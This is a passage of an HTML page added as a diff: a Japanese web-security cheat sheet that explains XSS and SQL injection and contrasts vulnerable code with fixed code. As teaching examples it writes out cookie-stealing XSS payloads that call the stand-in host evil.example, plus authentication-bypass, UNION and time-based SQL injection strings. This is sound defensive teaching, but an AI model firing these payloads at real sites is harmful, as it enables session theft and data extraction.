@@ -1,0 +1,655 @@
+<!doctype html>
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="XSS・セッションハイジャック・CSRF・SQLインジェクションなど、Web アプリの脆弱性と対策を仕組みから整理した早見表。悪い例と良い例をコードで対比し、リリース前の確認手順まで収録。">
+<style>
+html{color-scheme:light dark}
+body{margin:0}
+img{max-width:100%}
+[hidden]{display:none!important}
+</style>
+<title>Web セキュリティ早見表</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Zen+Kaku+Gothic+New:wght@400;500;700&display=swap">
+
+<style>
+:root{
+  --paper:#F4F6F9; --surface:#FFFFFF; --surface-2:#E9EEF4;
+  --ink:#131820; --ink-2:#525A67; --ink-3:#828B98;
+  --rule:#D8DEE6; --rule-strong:#BDC5D1;
+  --accent:#1257A6; --accent-ink:#0D4381;
+  --warn:#87590F; --warn-soft:#F2E7CE;
+  --r-sm:6px; --r-md:10px; --r-lg:14px;
+  --shadow-1:0 1px 2px rgba(15,23,42,.04), 0 1px 3px rgba(15,23,42,.06);
+  --shadow-2:0 6px 18px rgba(15,23,42,.08), 0 2px 6px rgba(15,23,42,.05);
+  --r-sm:6px; --r-md:10px; --r-lg:14px;
+  --shadow-1:0 1px 2px rgba(15,23,42,.04), 0 1px 3px rgba(15,23,42,.06);
+  --shadow-2:0 6px 18px rgba(15,23,42,.08), 0 2px 6px rgba(15,23,42,.05);
+  --mono:'JetBrains Mono','SFMono-Regular',Consolas,'Liberation Mono',monospace;
+  --sans:'Zen Kaku Gothic New','Hiragino Sans','Yu Gothic UI',system-ui,sans-serif;
+  --bar:56px;
+}
+@media (prefers-color-scheme: dark){
+  :root:not([data-theme="light"]){
+    --paper:#0F1216; --surface:#151A21; --surface-2:#1B222A;
+    --ink:#E6EAF1; --ink-2:#99A3B1; --ink-3:#77818F;
+    --rule:#252C35; --rule-strong:#37404A;
+    --accent:#63B3F5; --accent-ink:#8CC8FA;
+    --warn:#DFB35F; --warn-soft:#33280F;
+    --shadow-1:0 1px 2px rgba(0,0,0,.30), 0 1px 3px rgba(0,0,0,.24);
+    --shadow-2:0 8px 22px rgba(0,0,0,.42), 0 2px 6px rgba(0,0,0,.30);
+  }
+}
+:root[data-theme="dark"]{
+  --paper:#0F1216; --surface:#151A21; --surface-2:#1B222A;
+  --ink:#E6EAF1; --ink-2:#99A3B1; --ink-3:#77818F;
+  --rule:#252C35; --rule-strong:#37404A;
+  --accent:#63B3F5; --accent-ink:#8CC8FA;
+  --warn:#DFB35F; --warn-soft:#33280F;
+  --shadow-1:0 1px 2px rgba(0,0,0,.30), 0 1px 3px rgba(0,0,0,.24);
+  --shadow-2:0 8px 22px rgba(0,0,0,.42), 0 2px 6px rgba(0,0,0,.30);
+}
+
+*{box-sizing:border-box}
+body{
+  margin:0;background:var(--paper);color:var(--ink);
+  font-family:var(--sans);font-size:15px;line-height:1.7;
+  -webkit-font-smoothing:antialiased;
+}
+code{font-family:var(--mono);font-size:.88em;font-weight:500}
+
+.bar{position:sticky;top:0;z-index:40;background:var(--surface);border-bottom:1px solid var(--rule);box-shadow:var(--shadow-1)}
+@supports (backdrop-filter:blur(2px)){
+  .bar{background:color-mix(in srgb,var(--surface) 78%,transparent);backdrop-filter:blur(14px) saturate(140%)}
+}
+.bar-in{max-width:1280px;margin:0 auto;padding:10px 28px;display:flex;flex-wrap:wrap;align-items:center;gap:10px 18px}
+.brand{display:flex;align-items:baseline;gap:10px;flex:0 0 auto}
+.brand-name{font-size:15px;font-weight:700;letter-spacing:.01em;white-space:nowrap}
+.brand-meta{font-family:var(--mono);font-size:11px;color:var(--ink-3);white-space:nowrap}
+.home{
+  flex:0 0 auto;display:inline-flex;align-items:center;gap:6px;
+  font-family:var(--sans);font-size:12.5px;line-height:1;color:var(--ink-2);text-decoration:none;
+  border:1px solid var(--rule);border-radius:var(--r-md);background:var(--surface-2);padding:7px 12px;white-space:nowrap;
+  transition:color .12s,border-color .12s,background .12s;
+}
+.home:hover{color:var(--accent);border-color:var(--accent);background:var(--surface)}
+.home:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+.home i{font-family:var(--mono);font-style:normal;font-weight:700;color:var(--accent)}
+.search{flex:1 1 240px;min-width:0;position:relative;display:flex;align-items:center}
+.search::before{content:'/';position:absolute;left:13px;font-family:var(--mono);font-weight:700;color:var(--accent);pointer-events:none}
+.search input{
+  width:100%;font-family:var(--sans);font-size:13.5px;color:var(--ink);
+  background:var(--surface-2);border:1px solid var(--rule);border-radius:var(--r-md);padding:8px 14px 8px 28px;
+}
+.search input::placeholder{color:var(--ink-3)}
+.search input:focus-visible{outline:2px solid var(--accent);outline-offset:1px}
+.veil{
+  position:fixed;inset:0;z-index:100;
+  display:flex;flex-direction:column;align-items:center;justify-content:center;gap:14px;
+  background:var(--paper);transition:opacity .22s ease;
+}
+.veil.off{opacity:0;pointer-events:none}
+.veil-ring{
+  width:36px;height:36px;border-radius:50%;
+  border:2px solid var(--rule);border-top-color:var(--accent);
+  animation:veilspin .7s linear infinite;
+}
+.veil-text{margin:0;font-family:var(--mono);font-size:11px;letter-spacing:.16em;color:var(--ink-3)}
+@keyframes veilspin{to{transform:rotate(360deg)}}
+
+.editor{flex:1 0 100%;display:flex;align-items:center;gap:8px;padding-top:11px;border-top:1px solid var(--rule)}
+.editor-sig{flex:0 0 auto;font-family:var(--mono);font-size:12px;font-weight:700;color:var(--accent)}
+.editor input{
+  flex:1 1 auto;min-width:0;
+  font-family:var(--mono);font-size:13px;color:var(--ink);
+  background:var(--surface-2);border:1px solid var(--rule);border-radius:var(--r-md);padding:9px 12px;
+}
+.editor input::placeholder{font-family:var(--sans);font-size:12.5px;color:var(--ink-3)}
+.editor input:focus-visible{outline:2px solid var(--accent);outline-offset:1px}
+.editor-btn{
+  flex:0 0 auto;min-width:64px;cursor:pointer;
+  font-family:var(--sans);font-size:12.5px;font-weight:500;line-height:1;
+  background:var(--accent);border:1px solid var(--accent);color:#FFFFFF;
+  padding:9px 14px;border-radius:var(--r-md);box-shadow:var(--shadow-1);
+  transition:opacity .12s,transform .12s,color .12s,border-color .12s;
+}
+:root[data-theme="dark"] .editor-btn:not(.ghost){color:#0B1016}
+@media (prefers-color-scheme: dark){
+  :root:not([data-theme="light"]) .editor-btn:not(.ghost){color:#0B1016}
+}
+.editor-btn.ghost{background:transparent;border-color:var(--rule);color:var(--ink-2);box-shadow:none}
+.editor-btn:hover{opacity:.92;transform:translateY(-1px)}
+.editor-btn.ghost:hover{opacity:1;color:var(--accent);border-color:var(--accent)}
+.editor-btn:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+.sortsel{display:inline-flex;background:var(--surface-2);border:1px solid var(--rule);border-radius:999px;padding:2px;flex:0 0 auto}
+.sortsel button{
+  font-family:var(--sans);font-size:11.5px;line-height:1;color:var(--ink-2);
+  background:transparent;border:0;border-radius:999px;padding:6px 12px;cursor:pointer;
+  white-space:nowrap;transition:background .14s,color .14s;
+}
+.sortsel button:hover{color:var(--ink)}
+.sortsel button[aria-checked="true"]{background:var(--accent);color:#FFFFFF;font-weight:500}
+:root[data-theme="dark"] .sortsel button[aria-checked="true"]{color:#0B1016}
+@media (prefers-color-scheme: dark){
+  :root:not([data-theme="light"]) .sortsel button[aria-checked="true"]{color:#0B1016}
+}
+.sortsel button:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+
+/* 便利順のときだけ星を出す。掲載順では邪魔なので隠す */
+.rank{display:none;font-family:var(--mono);font-size:10px;letter-spacing:-.08em;color:var(--accent);margin-right:6px;white-space:nowrap}
+body.byuse .rank{display:inline}
+
+.hitcount{font-family:var(--mono);font-size:11.5px;color:var(--ink-3);font-variant-numeric:tabular-nums;white-space:nowrap;margin-left:auto}
+.barmin{
+  flex:0 0 auto;display:inline-flex;align-items:center;justify-content:center;
+  width:28px;height:28px;padding:0;cursor:pointer;
+  background:var(--surface-2);border:1px solid var(--rule);border-radius:50%;
+  color:var(--ink-2);font-family:var(--mono);font-size:12px;line-height:1;
+  transition:color .12s,border-color .12s,transform .18s;
+}
+.barmin:hover{color:var(--accent);border-color:var(--accent)}
+.barmin:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+.bar-in{transition:padding .16s}
+.bar.min .barmin{transform:rotate(180deg)}
+.bar.min .bar-in{padding-top:5px;padding-bottom:5px}
+.bar.min .brand-meta{display:none}
+.bar.min .brand-name{font-size:13.5px}
+
+.shell{max-width:1280px;margin:0 auto;padding:0 28px 90px;display:grid;grid-template-columns:214px minmax(0,1fr);gap:40px;align-items:start}
+.rail{
+  position:sticky;top:var(--bar);max-height:calc(100vh - var(--bar));
+  overflow-y:auto;overscroll-behavior:contain;padding:24px 10px 40px 0;
+  scrollbar-width:thin;scrollbar-color:var(--rule-strong) transparent;
+}
+.rail::-webkit-scrollbar{width:6px}
+.rail::-webkit-scrollbar-track{background:transparent}
+.rail::-webkit-scrollbar-thumb{background:var(--rule-strong);border-radius:999px}
+.rail h2{font-family:var(--mono);font-size:10px;letter-spacing:.16em;text-transform:uppercase;color:var(--ink-3);margin:0 0 6px;font-weight:500}
+.rail h2:not(:first-child){margin-top:20px}
+.navlist{display:flex;flex-direction:column;gap:1px}
+.rail a{
+  display:flex;justify-content:space-between;align-items:baseline;gap:8px;
+  padding:5px 10px;margin-left:-10px;border-radius:var(--r-sm);
+  color:var(--ink-2);text-decoration:none;
+  font-size:13px;line-height:1.45;transition:background .12s,color .12s;
+}
+.rail a:hover{color:var(--ink);background:var(--surface-2)}
+.rail a[aria-current="true"]{color:var(--accent-ink);background:var(--surface-2);font-weight:600}
+.rail a span{font-family:var(--mono);font-size:10.5px;color:var(--ink-3);font-variant-numeric:tabular-nums}
+.rail a:focus-visible{outline:2px solid var(--accent);outline-offset:1px}
+
+main{padding-top:32px;min-width:0}
+.preface{margin:0 0 30px;color:var(--ink-2);font-size:13px;max-width:76ch}
+
+.sec{margin:0 0 52px;scroll-margin-top:calc(var(--bar) + 18px)}
+.sec-head{display:flex;align-items:baseline;justify-content:space-between;gap:16px;padding-bottom:2px}
+.sec-head h3{font-size:19px;font-weight:700;margin:0;line-height:1.35;letter-spacing:-.01em;text-wrap:balance}
+.sec-head .n{font-family:var(--mono);font-size:11px;color:var(--ink-3);white-space:nowrap;font-variant-numeric:tabular-nums}
+.sec-note{margin:9px 0 0;color:var(--ink-2);font-size:13px;max-width:70ch}
+
+.tablewrap{
+  overflow-x:auto;margin-top:14px;
+  background:var(--surface);border:1px solid var(--rule);
+  border-radius:var(--r-lg);box-shadow:var(--shadow-1);
+}
+table{border-collapse:collapse;width:100%;min-width:760px}
+thead th{
+  font-family:var(--mono);font-size:10px;letter-spacing:.14em;text-transform:uppercase;
+  color:var(--ink-3);font-weight:500;text-align:left;padding:11px 16px;
+  background:var(--surface-2);border-bottom:1px solid var(--rule);white-space:nowrap;
+}
+tbody td{padding:13px 16px;border-bottom:1px solid var(--rule);vertical-align:top;font-size:13px;line-height:1.68}
+tbody tr:last-child td{border-bottom:0}
+tbody tr:hover td{background:var(--surface-2)}
+.c-cmd{width:18%}
+.c-sum{width:20%}
+.c-det{width:auto}
+.c-par{width:27%}
+.cols-3 .c-cmd{width:22%}
+.cols-3 .c-sum{width:auto}
+.cols-3 .c-par{width:34%}
+.tkeys th:nth-child(1),.tkeys td:nth-child(1){width:26%}
+.tkeys th:nth-child(2),.tkeys td:nth-child(2){width:21%}
+.tkeys th:nth-child(3),.tkeys td:nth-child(3){width:21%}
+.tkeys th:nth-child(4),.tkeys td:nth-child(4){width:auto}
+
+.cmd{
+  font-family:var(--mono);font-size:12.5px;font-weight:500;background:none;border:0;
+  padding:3px 7px;margin:-3px -7px;cursor:pointer;color:var(--ink);text-align:left;line-height:1.5;
+  border-radius:var(--r-sm);word-break:break-word;transition:background .12s,color .12s;
+}
+.cmd i{color:var(--accent);font-style:normal}
+.cmd:hover{background:var(--surface-2)}
+.cmd:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+.cmd.copied{color:var(--accent-ink);background:var(--surface-2)}
+.act{color:var(--ink);font-weight:500}
+.aliases{display:flex;flex-wrap:wrap;gap:4px;margin-top:5px}
+.alias{font-family:var(--mono);font-size:10px;color:var(--ink-3);border:1px solid var(--rule);border-radius:999px;padding:1px 8px;white-space:nowrap}
+.pcell{min-width:0}
+.par{font-family:var(--mono);font-size:11.5px;color:var(--ink-2);word-break:break-word;display:block}
+.par.none{color:var(--ink-3)}
+.sum{color:var(--ink)}
+.det{color:var(--ink-2)}
+.det code,.sum code{background:var(--surface-2);border-radius:5px;padding:2px 5px;color:var(--ink)}
+.ex{
+  display:flex;gap:7px;margin-top:7px;width:100%;
+  font-family:var(--mono);font-size:11.5px;line-height:1.6;text-align:left;
+  background:var(--surface-2);border:0;border-radius:var(--r-md);
+  box-shadow:inset 3px 0 0 var(--accent);
+  padding:7px 10px 7px 12px;color:var(--ink);cursor:pointer;white-space:pre-wrap;word-break:break-word;
+  transition:box-shadow .12s;
+}
+.ex:hover{box-shadow:inset 3px 0 0 var(--accent),inset 0 0 0 1px var(--rule-strong)}
+.ex:focus-visible{outline:2px solid var(--accent);outline-offset:1px}
+.ex.copied{box-shadow:inset 3px 0 0 var(--accent),inset 0 0 0 1px var(--accent)}
+.ex b{color:var(--accent);font-weight:700;flex:0 0 auto;user-select:none;width:.9em}
+
+.keycell{
+  display:flex;flex-wrap:wrap;gap:4px;align-items:center;width:100%;
+  background:none;border:0;padding:1px 0;margin:0;cursor:pointer;text-align:left;
+}
+.keycell:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+.keycell.copied kbd{border-color:var(--accent);color:var(--accent-ink)}
+kbd{
+  font-family:var(--mono);font-size:11px;line-height:1.6;
+  border:1px solid var(--rule-strong);border-bottom-width:2px;border-radius:6px;
+  padding:2px 7px;background:var(--surface);color:var(--ink);white-space:nowrap;
+}
+.keycell:hover kbd{border-color:var(--ink-3)}
+.ksep{font-family:var(--mono);font-size:10px;color:var(--ink-3)}
+.knone{font-family:var(--mono);font-size:11.5px;color:var(--ink-3)}
+
+.tag{display:inline-block;font-family:var(--mono);font-size:10px;padding:2px 9px;border-radius:999px;margin-top:6px;background:var(--warn-soft);color:var(--warn)}
+.kindchip{display:inline-block;font-size:9.5px;letter-spacing:.06em;padding:1px 8px;border-radius:999px;margin-top:5px;border:1px solid}
+.k-read{color:var(--ink-3);border-color:var(--rule-strong)}
+.k-write{color:var(--accent-ink);border-color:var(--accent)}
+.k-delete{color:var(--warn);border-color:var(--warn);background:var(--warn-soft)}
+tr.flagged td:first-child{box-shadow:inset 3px 0 0 var(--warn)}
+
+.priority td:first-child{font-family:var(--mono);font-size:12px;color:var(--accent-ink);white-space:nowrap}
+
+footer{max-width:1280px;margin:0 auto;padding:28px 28px 60px;border-top:1px solid var(--rule);color:var(--ink-2);font-size:12.5px}
+footer ul{margin:8px 0 0;padding-left:1.1em}
+footer li{margin-bottom:5px}
+footer .siblings{margin-top:16px;display:flex;flex-wrap:wrap;gap:6px 14px;font-size:12.5px}
+footer .siblings a{color:var(--accent-ink)}
+
+.empty{display:none;padding:40px 0;color:var(--ink-3);font-family:var(--mono);font-size:13px;text-align:center}
+.empty.on{display:block}
+
+@media (max-width:900px){
+  .shell{grid-template-columns:1fr;gap:0}
+  .rail{position:static;max-height:none;overflow:visible;padding:20px 0 16px;border-bottom:1px solid var(--rule)}
+  .navlist{flex-direction:row;flex-wrap:wrap;gap:2px 5px}
+  .rail a{border:1px solid var(--rule);border-radius:999px;padding:4px 11px;margin-left:0}
+  .rail a[aria-current="true"]{border-color:var(--accent)}
+  .rail h2:not(:first-child){margin-top:14px}
+}
+@media (max-width:680px){
+  .bar-in,.shell,footer{padding-left:18px;padding-right:18px}
+  .hitcount{margin-left:0}
+  table{min-width:0}
+  thead{display:none}
+  tbody tr{display:block;border-bottom:1px solid var(--rule);padding:12px 14px}
+  tbody tr:hover td{background:none}
+  tbody td{display:grid;grid-template-columns:5.6em minmax(0,1fr);gap:10px;border:0;padding:3px 0}
+  tbody td::before{content:attr(data-label);font-family:var(--mono);font-size:10px;letter-spacing:.08em;color:var(--ink-3);padding-top:4px}
+  .tkeys th:nth-child(n),.tkeys td:nth-child(n){width:auto}
+  tr.flagged td:first-child{box-shadow:none;padding-left:0}
+  tr.flagged{box-shadow:inset 3px 0 0 var(--warn)}
+}
+@media (prefers-reduced-motion: reduce){*{transition:none!important;animation:none!important}}
+@media (prefers-reduced-motion: reduce){.veil-ring{animation:veilspin 2.4s linear infinite!important}}
+</style>
+</head>
+<body>
+<div class="veil" id="veil" role="status" aria-live="polite">
+  <div class="veil-ring"></div>
+  <p class="veil-text">読み込み中</p>
+</div>
+<script>
+// 組み立て前にスクリプトが落ちても覆いを残さない
+addEventListener('error', () => { const v = document.getElementById('veil'); if (v) v.remove(); });
+</script>
+<header class="bar" id="bar">
+  <div class="bar-in">
+    <a class="home" href="../../" title="dev_box に戻る"><i>‹</i>dev_box</a>
+    <div class="brand">
+      <span class="brand-name">Web セキュリティ早見表</span>
+      <span class="brand-meta">攻撃の仕組みと対策 · 2026-09-06</span>
+    </div>
+    <label class="search">
+      <input id="q" type="search" placeholder="攻撃名・対策で絞り込む（例: XSS, セッション, CSRF）" autocomplete="off" spellcheck="false" aria-label="検索">
+    </label>
+    <div class="sortsel" id="sortsel" role="radiogroup" aria-label="並び順">
+      <button type="button" role="radio" data-v="doc" aria-checked="true">掲載順</button>
+      <button type="button" role="radio" data-v="use" aria-checked="false">便利順</button>
+    </div>
+    <span class="hitcount" id="hits"></span>
+    <button class="barmin" id="barmin" type="button" aria-expanded="true" aria-label="ヘッダーを最小化" title="ヘッダーを最小化">⌃</button>
+    <div class="editor">
+      <span class="editor-sig">▸</span>
+      <input id="edit" type="text" spellcheck="false" autocomplete="off" placeholder="クリックした行がここに入る。書き換えてコピーできる" aria-label="コマンド編集">
+      <button class="editor-btn" id="editcopy" type="button" title="編集した内容をコピー">コピー</button>
+      <button class="editor-btn ghost" id="editclear" type="button" title="編集欄を空にする">クリア</button>
+    </div>
+  </div>
+</header>
+
+<div class="shell">
+  <nav class="rail" id="rail" aria-label="カテゴリ"></nav>
+  <main id="main">
+    <p class="preface">Web アプリでよく起きる脆弱性を、<b>「何が起きるか」「なぜ起きるか」「どう防ぐか」</b>の順で並べた早見表。 対策は<b>悪い例と良い例をコードで対比</b>している。項目名と例はクリックでコピーできる。 攻撃名を覚えるより、冒頭の<b>考え方</b>を掴むほうが応用が利く。</p>
+    <p class="empty" id="empty">該当なし</p>
+  </main>
+</div>
+
+<footer>
+  <strong>注記</strong>
+  <ul>
+    <li>分類と用語は <b>OWASP Top 10</b> と <b>CWE</b> の考え方に沿っているが、実務で当たる順に並べ替えている。</li>
+    <li>コード例は要点を示すための断片で、そのまま貼って動くものではない。<b>使っているフレームワークの標準機能を優先すること</b>（大半は既に対策を持っている）。</li>
+    <li><b>重大</b>はサーバーやデータを丸ごと失いうるもの、<b>誤解</b>は対策したつもりで守れていない典型を指す。</li>
+    <li>ここに書いたのは<b>自分が開発・運用するシステムを守るための内容</b>。他者のシステムへの試行は、許可を得た診断や自分の検証環境に限ること。</li>
+    <li>網羅を目的にしていない。実際の設計では OWASP ASVS のような体系的なチェックリストと併用すること。</li>
+  </ul>
+  <div class="siblings"><span>同じシリーズ:</span><a href="../protocols/">プロトコル早見表</a><a href="../claude-code-commands/">Claude Code コマンド索引</a><a href="../git-commands/">Git コマンド索引</a><a href="../aws-cli-commands/">AWS CLI コマンド索引</a><a href="../gcp-cli-commands/">gcloud コマンド索引</a><a href="../spring-annotations/">Spring アノテーション一覧</a></div>
+</footer>
+
+<script type="module">
+const SIGIL = "›";
+const DATA = [{"g":"basic","id":"basic","t":"まず押さえる考え方","note":"個々の攻撃名を覚える前に、**なぜ起きるのか**の型を掴むと応用が利く。ほとんどの脆弱性は「データと命令の混同」か「信用してはいけないものを信用した」のどちらか。","cols":["項目","何が起きるか","仕組みと対策","分類"],"rows":[["データと命令の混同","ユーザーの入力が命令として実行される","**注入系（XSS・SQLi・コマンドインジェクション）はすべてこの一種**。文字列を連結して命令を組み立てると、入力に含まれた記号が構文として解釈されてしまう。対策も共通で、**連結をやめて「ここは値だ」と処理系に伝える**（プレースホルダ、テキストノード、引数配列）。","原理",{"ex":"// 連結する限り、どんなに頑張ってもいたちごっこになる\n\"SELECT * FROM users WHERE id = \" + input\n\n// 値として渡せば、記号は記号のまま扱われる\n\"SELECT * FROM users WHERE id = ?\", [input]","u":3}],["信頼境界","どこから先を疑うかの線引き","**ブラウザから来るものはすべて改ざんできる**。Cookie、ヘッダ、隠しフィールド、JavaScript の検証結果、`Referer`、価格や権限のパラメータ。「画面で選べないから送られてこない」は成り立たない。","原理",{"ex":"// 画面に出していない値でも送られてくる\nPOST /orders  { \"itemId\": 1, \"price\": 0, \"role\": \"admin\" }","u":3}],["入力検証と出力対策","どちらか片方では守れない","**入力検証は「受け付ける形を絞る」、出力対策は「使う場所に合わせて無害化する」**。同じ文字列でも HTML・SQL・シェル・URL で危険な記号は違うため、**無害化は使う直前に、使う文脈に合わせて**行う。","原理",{"ex":"// 入力時に一律エスケープすると、二重エスケープや取りこぼしが起きる\n// 保存は生のまま、出力する場所ごとに処理する","u":3}],["許可リストと拒否リスト","どちらを既定にするか","**拒否リスト（ブラックリスト）は必ず抜ける**。攻撃側は書き方を変えられる。「許すものだけ列挙する」許可リストを既定にする。","原理",{"ex":"// NG: 危険なものを消す\ninput.replace(/<script>/gi, \"\")   // <ScRiPt> や <img onerror> が通る\n\n// OK: 許す形だけ通す\nif (!/^[0-9]{1,10}$/.test(input)) throw new Error(\"invalid\");","u":3}],["多層防御","1つ破られても止まる構え","**対策を1つに賭けない**。XSS ならエスケープ＋CSP＋HttpOnly、認証なら パスワード強度＋MFA＋レート制限。どれか1つの実装漏れが即座に被害にならない状態を作る。","原理",{"ex":"// 出力エスケープ（本命）\n// + CSP（漏れたときの保険）\n// + HttpOnly（成功しても Cookie は取られない）","u":3}],["最小権限","必要な分だけ与える","**アプリの DB ユーザーに DDL は要らない**。侵入されたときの被害の大きさは、その時点の権限で決まる。トークンの寿命も同じ考え方。","原理",{"ex":"GRANT SELECT, INSERT, UPDATE, DELETE ON app.* TO 'app'@'%';\n-- DROP や GRANT は与えない","u":3}],["安全側に倒す","失敗したときにどう転ぶか","**判定に失敗したら拒否する**。例外が出たときに「とりあえず通す」実装は、攻撃で例外を起こせば認可を素通りできる。","原理",{"ex":"// NG\ntry { allowed = check(user); } catch (e) { allowed = true; }\n\n// OK\ntry { allowed = check(user); } catch (e) { allowed = false; }","u":3}]]},{"g":"inject","id":"xss","t":"XSS（クロスサイトスクリプティング）","note":"**攻撃者の JavaScript を、被害者のブラウザで、そのサイトの権限で動かされる**。Cookie の窃取、画面の書き換え、勝手な操作の実行まで何でもできる。","cols":["項目","何が起きるか","仕組みと対策","分類"],"rows":[["XSS とは","他人のブラウザで任意の JS が動く","**そのサイトの一員として動く**のが恐ろしい点。同一オリジンなので、Cookie も localStorage も画面の中身も自由に読め、ログイン済みの操作を代行できる。「表示が崩れるだけ」ではない。","概要",{"ex":"// 攻撃者が仕込む典型\n<script>fetch(\"https://evil.example/?c=\"+document.cookie)</script>","u":3}],["反射型 XSS","細工した URL を踏ませる","**URL のパラメータがそのまま画面に出る**場合に成立する。攻撃者はリンクをメールやSNSで送り、被害者に踏ませる。サーバーには痕跡が残る。","種類",{"ex":"// 検索結果に検索語をそのまま表示している\n/search?q=<script>alert(1)</script>","u":3}],["格納型 XSS","保存された内容が全員に配られる","**投稿やプロフィールに仕込まれ、閲覧者全員が被害に遭う**。踏ませる必要がないため反射型より深刻。掲示板、コメント、管理画面のログ表示が典型。","種類",{"ex":"// コメントとして保存された内容が、閲覧者全員のブラウザで実行される\n<img src=x onerror=\"fetch('//evil.example/?c='+document.cookie)\">","u":3}],["DOM 型 XSS","JS が自分で危険な代入をする","**サーバーを一切通らない**ので、サーバー側のログにも WAF にも引っかからない。`location.hash` などの値を `innerHTML` に入れると成立する。","種類",{"ex":"// ハッシュの内容をそのまま描画している\ndocument.getElementById(\"out\").innerHTML = location.hash.slice(1);\n// /page#<img src=x onerror=alert(1)>","u":3}],["危険なシンク","入力を渡してはいけない場所","**`innerHTML` `outerHTML` `document.write` `eval` `setTimeout(文字列)` `new Function` `insertAdjacentHTML`**、jQuery の `$(...)` や `.html()`。ここに外部由来の値が届いていないかを追う。","要注意",{"ex":"// すべて実行につながりうる\nel.innerHTML = v;  document.write(v);  eval(v);\nsetTimeout(v);     new Function(v);   el.insertAdjacentHTML(\"beforeend\", v);","u":3}],["対策: テキストとして入れる","最も確実で単純","**`textContent` を使えば、どんな文字列でもただの文字になる**。HTML を組み立てる必要が無いなら、これで終わり。","対策",{"ex":"// NG\nel.innerHTML = userInput;\n\n// OK\nel.textContent = userInput;","u":3}],["対策: 文脈に応じたエスケープ","出す場所で必要な処理が違う","**HTML 本文・属性値・JS の中・URL・CSS で、危険な記号が違う**。テンプレートエンジンの自動エスケープは HTML 本文向けなので、属性や JS 内では足りないことがある。","対策",{"ex":"// HTML 本文:  & < > \" を実体参照へ\n// 属性値:     必ず引用符で囲む + 同上\n// URL:        encodeURIComponent\n// JS の中:    そもそも埋め込まない（data 属性経由で渡す）","u":3}],["対策: テンプレートの自動エスケープを切らない","「そのまま出す」機能が抜け道","**Thymeleaf の `th:utext`、React の `dangerouslySetInnerHTML`、Vue の `v-html`、Handlebars の `{{{ }}}`** は自動エスケープを外す。使う箇所を洗い出し、必要ならサニタイザを通す。","対策",{"ex":"// 危険。使うならサニタイズ済みの値だけ\n<div dangerouslySetInnerHTML={{ __html: html }} />\n<div v-html=\"html\"></div>\n<div th:utext=\"${html}\"></div>","u":3}],["対策: サニタイズ","HTML を許したいときの唯一の道","**自作の正規表現では必ず抜ける**。実績のあるライブラリ（DOMPurify、OWASP Java HTML Sanitizer）で、許可タグを絞って通す。","対策",{"ex":"import DOMPurify from \"dompurify\";\nel.innerHTML = DOMPurify.sanitize(html, {\n  ALLOWED_TAGS: [\"b\", \"i\", \"a\", \"p\", \"br\"],\n  ALLOWED_ATTR: [\"href\"]\n});","u":3}],["対策: CSP","漏れたときの保険","**`script-src` を絞ると、埋め込まれたスクリプトが実行されない**。`unsafe-inline` を外すのが本質で、外せないなら nonce か hash を使う。","対策",{"ex":"Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-r4nd0m'; object-src 'none'; base-uri 'self'","u":3}],["対策: HttpOnly","盗まれるものを減らす","**XSS が成立しても、セッション Cookie は読めなくなる**。防ぐのではなく被害を限定する対策。","対策",{"ex":"Set-Cookie: session=...; Secure; HttpOnly; SameSite=Lax","u":3}],["よくある誤解: 入力時のエスケープ","保存時に加工すると壊れる","**保存は生のまま、出力時に処理する**。入力時に HTML エスケープすると、JSON API や CSV 出力で `&amp;` が混じり、二重エスケープの温床になる。","誤解",{"ex":"// 保存: そのまま\n// HTML に出す時: エスケープ\n// JSON に出す時: JSON の規則で\n// CSV に出す時: CSV の規則で","u":3}],["よくある誤解: JS で検証しているから安全","クライアント検証は防御ではない","**開発者ツールでも curl でも直接送れる**。JS の検証は入力補助であり、サーバー側の検証を省く理由にならない。","誤解",{"ex":"curl -X POST https://example.com/comment -d 'body=<script>alert(1)</script>'","u":3}],["よくある誤解: href に入れれば安全","URL 自体が実行になる","**`javascript:` スキームでスクリプトが動く**。URL を外部から受け取るなら、スキームを許可リストで縛る。","誤解",{"ex":"// NG\na.href = userInput;   // javascript:alert(1)\n\n// OK\nconst u = new URL(userInput, location.origin);\nif (![\"http:\", \"https:\"].includes(u.protocol)) throw new Error(\"invalid\");","u":3}],["確認方法","手元で試す","**アラートではなく `console.log` や外部への通信で確認する**（アラートは CSP やブラウザの保護で出ないことがある）。まず素直な文字列を入れて、どこで壊れるかを見る。","診断",{"ex":"\"><img src=x onerror=console.log(1)>\n';alert(1);//\n{{7*7}}    ← 49 と表示されればテンプレート注入の疑い","u":2}]]},{"g":"inject","id":"sqli","t":"SQL インジェクション","note":"**データベースの内容を丸ごと読まれる／消される**。被害が最も直接的で、一度で終わる。対策も確立している。","cols":["項目","何が起きるか","仕組みと対策","分類"],"rows":[["SQL インジェクションとは","入力が SQL の構文として解釈される","**文字列連結でクエリを組むと、入力に含まれる `'` が文字列の終端として働く**。以降は攻撃者が書いた SQL になる。認証の迂回、全件取得、テーブル削除まで可能。","概要",{"ex":"-- 入力: ' OR '1'='1\nSELECT * FROM users WHERE name = '' OR '1'='1'","u":3}],["認証の迂回","パスワードを知らずに入れる","**条件が常に真になる入力**を送るだけで、最初のユーザーとしてログインできてしまう。","手口",{"ex":"-- 入力: admin'--\nSELECT * FROM users WHERE name = 'admin'--' AND pass = '...'","u":3}],["UNION による抜き取り","別のテーブルを結果に混ぜる","**列数と型を合わせて `UNION SELECT` を継ぎ足す**と、本来返らないテーブルの中身が画面に出る。","手口",{"ex":"-- 入力: ' UNION SELECT id, password FROM users--","u":3}],["ブラインド SQLi","エラーが出なくても抜ける","**「真なら表示が変わる」「真なら応答が遅れる」**という差分だけで1文字ずつ特定される。エラーを隠しても防御にならない。","手口",{"ex":"-- 真偽で表示が変わる\n' AND (SELECT substr(password,1,1) FROM users LIMIT 1) = 'a'--\n\n-- 時間差で判定する\n' AND SLEEP(5)--","u":3}],["対策: プレースホルダ","本命の対策","**値と命令を別々に処理系へ渡す**。これで入力に何が入っていても構文にはならない。ほぼすべての言語と 